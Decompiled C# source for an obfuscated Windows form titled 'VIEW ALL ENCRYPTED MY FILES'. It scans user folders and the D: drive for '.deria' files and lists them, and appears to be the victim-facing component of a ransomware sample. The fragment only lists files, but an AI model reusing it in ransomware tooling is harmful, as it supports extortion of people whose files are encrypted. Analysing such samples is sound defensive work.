using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using LOGON.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;

namespace LOGON;

[DesignerGenerated]
public class DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	internal virtual ListBox ListBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListBox1 = value;
		}
	}

	[DebuggerNonUserCode]
	public DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD()
	{
		((Form)this).add_Load((EventHandler)Form4_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ListBox1 = new ListBox();
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		Point location = new Point(12, 12);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		Size size = new Size(963, 628);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(0);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(987, 650);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form4");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("VIEW ALL ENCRYPTED MY FILES");
		((Control)this).ResumeLayout(false);
	}

	private void Form4_Load(object sender, EventArgs e)
	{
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments(), (SearchOption)3, new string[0]))
			{
				foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory, (SearchOption)3, new string[1] { "*.deria" }))
				{
					if (!file.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file))
					{
						string text = Strings.Replace(file, ".deria", "", 1, -1, (CompareMethod)0);
						ListBox1.get_Items().Add((object)text);
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments(), (SearchOption)2, new string[1] { "*.deria" }))
			{
				if (!file2.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file2))
				{
					string text2 = Strings.Replace(file2, ".deria", "", 1, -1, (CompareMethod)0);
					ListBox1.get_Items().Add((object)text2);
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic(), (SearchOption)3, new string[0]))
			{
				foreach (string file3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory2, (SearchOption)3, new string[1] { "*.deria" }))
				{
					if (!file3.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file3))
					{
						string text3 = Strings.Replace(file3, ".deria", "", 1, -1, (CompareMethod)0);
						ListBox1.get_Items().Add((object)text3);
					}
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic(), (SearchOption)2, new string[1] { "*.deria" }))
			{
				if (!file4.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file4))
				{
					string text4 = Strings.Replace(file4, ".deria", "", 1, -1, (CompareMethod)0);
					ListBox1.get_Items().Add((object)text4);
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures(), (SearchOption)3, new string[0]))
			{
				foreach (string file5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory3, (SearchOption)3, new string[1] { "*.deria" }))
				{
					if (!file5.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file5))
					{
						string text5 = Strings.Replace(file5, ".deria", "", 1, -1, (CompareMethod)0);
						ListBox1.get_Items().Add((object)text5);
					}
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures(), (SearchOption)2, new string[1] { "*.deria" }))
			{
				if (!file6.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file6))
				{
					string text6 = Strings.Replace(file6, ".deria", "", 1, -1, (CompareMethod)0);
					ListBox1.get_Items().Add((object)text6);
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\" + Environment.UserName + "\\Downloads", (SearchOption)3, new string[0]))
			{
				foreach (string file7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory4, (SearchOption)3, new string[1] { "*.deria" }))
				{
					if (!file7.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file7))
					{
						string text7 = Strings.Replace(file7, ".deria", "", 1, -1, (CompareMethod)0);
						ListBox1.get_Items().Add((object)text7);
					}
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\" + Environment.UserName + "\\Downloads", (SearchOption)2, new string[1] { "*.deria" }))
			{
				if (!file8.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file8))
				{
					string text8 = Strings.Replace(file8, ".deria", "", 1, -1, (CompareMethod)0);
					ListBox1.get_Items().Add((object)text8);
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\" + Environment.UserName + "\\Desktop", (SearchOption)3, new string[0]))
			{
				foreach (string file9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory5, (SearchOption)3, new string[1] { "*.deria" }))
				{
					if (!file9.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file9))
					{
						string text9 = Strings.Replace(file9, ".deria", "", 1, -1, (CompareMethod)0);
						ListBox1.get_Items().Add((object)text9);
					}
				}
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\" + Environment.UserName + "\\Desktop", (SearchOption)2, new string[1] { "*.deria" }))
			{
				if (!file10.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file10))
				{
					string text10 = Strings.Replace(file10, ".deria", "", 1, -1, (CompareMethod)0);
					ListBox1.get_Items().Add((object)text10);
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\", (SearchOption)3, new string[0]))
			{
				foreach (string file11 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory6, (SearchOption)3, new string[1] { "*.deria" }))
				{
					if (!file11.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file11))
					{
						string text11 = Strings.Replace(file11, ".deria", "", 1, -1, (CompareMethod)0);
						ListBox1.get_Items().Add((object)text11);
					}
				}
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file12 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("D:\\", (SearchOption)2, new string[1] { "*.deria" }))
			{
				if (!file12.EndsWith("desktop.ini") && !ListBox1.get_Items().Contains((object)file12))
				{
					string text12 = Strings.Replace(file12, ".deria", "", 1, -1, (CompareMethod)0);
					ListBox1.get_Items().Add((object)text12);
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file13 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory7))
				{
					_ = file13;
					if (directory7.EndsWith(".deria") && !ListBox1.get_Items().Contains((object)directory7))
					{
						string text13 = Strings.Replace(directory7, ".deria", "", 1, -1, (CompareMethod)0);
						ListBox1.get_Items().Add((object)text13);
					}
				}
			}
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
	}
}
